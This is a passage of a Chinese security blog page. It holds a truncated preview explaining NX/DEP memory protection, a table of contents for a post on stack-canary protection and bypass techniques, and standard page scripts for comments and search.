protection)作为一个统称，来描述这种防止传统代码注入攻击的技术——攻击者将恶意代码注入正在运行的程序中，然后使用内存损坏漏洞将控制流重定向到该代码。实施这种保护的技术有多种名称，在 Windows上称为数据执行保护(DEP)，在Linux上则有 NX、WX、Pax和 Exec Shield 等。  NX的实现需要结合软件和硬件共同完成。首先在硬件层面，它利用处理器的NX位，对相应页表项中的第63位进行设置，设置为1表示内容不可执行，设置为0则表示内容可执行。一旦程序计数器(PC)被放到受保护的页面内，就会触发硬件层面的异常。其次，在软件层面，操作系统需要支持 NX，以便正确配置页表，但有时这会给自修改代码或者动态生成的代码(JT编译代码)带来一些问题，这在浏览器上很常见。这时，软件需要使用适当的API来分配内存，例如Wimdows上使用 V...</div></div></div></a><a class="pagination-related" href="/2025/07/687b40b96b60.html" title="Linux目录结构"><img class="cover" src="/img/w1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Linux目录结构</div></div><div class="info-2"><div class="info-item-1">根目录的子目录   目录 内容    &#x2F;bin bin是Binary的缩写, 这个目录存放着最经常使用的命令，由系统、系统管理员和用户共享   &#x2F;boot 这里存放的是启动Linux时使用的一些核心文件，包括一些链接文件以及镜像文件   &#x2F;dev dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的   &#x2F;etc 大多数重要的系统配置文件都在&#x2F;etc目录下，该目录包含的数据类似于Windows控制面板中的数据   &#x2F;home 普通用户的家目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的   &#x2F;lib 库文件，包括系统和用户所需要的各种程序的文件   &#x2F;lost+found 每个分区在其上目录中都有一个lost+found。故障期间保存的文件在这里   &#x2F;media linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下   &#x2F...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.1.</span> <span class="toc-text">简单程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8-GCC-%E4%B8%AD%E4%BD%BF%E7%94%A8-Canary"><span class="toc-number">2.2.</span> <span class="toc-text">在 GCC 中使用 Canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">Canary 实现原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary-%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-number">2.4.</span> <span class="toc-text">Canary 绕过技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E8%A8%80"><span class="toc-number">2.4.1.</span> <span class="toc-text">序言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E4%B8%AD%E7%9A%84-Canary"><span class="toc-number">2.4.2.</span> <span class="toc-text">泄露栈中的 Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">利用示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#one-by-one-%E7%88%86%E7%A0%B4-Canary"><span class="toc-number">2.4.3.</span> <span class="toc-text">one-by-one 爆破 Canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-stack-chk-fail-%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.4.</span> <span class="toc-text">劫持__stack_chk_fail 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96-TLS-%E4%B8%AD%E5%82%A8%E5%AD%98%E7%9A%84-Canary-%E5%80%BC"><span class="toc-number">2.4.5.</span> <span class="toc-text">覆盖 TLS 中储存的 Canary 值</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/w2.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Rhea</span></div><div class="footer_custom_text">Hi,welocome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'Rhea006/rhea006.github.io',
+      'data-repo-id': 'R_kgDOO6e8Gw',
+      'data-category-id': 'DIC_kwDOO6e8G84CtK5G',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="search..." type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
